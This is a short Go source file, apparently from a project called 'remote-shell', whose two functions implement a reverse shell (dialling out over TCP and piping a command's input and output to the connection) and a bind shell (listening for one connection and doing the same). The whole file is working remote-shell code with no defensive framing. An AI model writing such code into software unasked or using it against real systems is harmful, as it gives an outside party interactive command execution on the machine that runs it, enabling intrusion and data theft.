package Modes

import (
	"log"
	"net"
	"remote-shell/src/Shell"
)

func ReverseShell(address string, command string, arguments []string) {
	connection, connectionError := net.Dial("tcp", address)
	if connectionError != nil {
		log.Fatal(connectionError)
	}
	log.Fatal(Shell.Execute(command, arguments, connection, connection, connection))
}

func BindShell(address string, command string, arguments []string) {
	listener, listenError := net.Listen("tcp", address)
	if listenError != nil {
		log.Fatal(listenError)
	}
	connection, connectionError := listener.Accept()
	if connectionError != nil {
		log.Fatal(connectionError)
	}
	log.Fatal(Shell.Execute(command, arguments, connection, connection, connection))
}
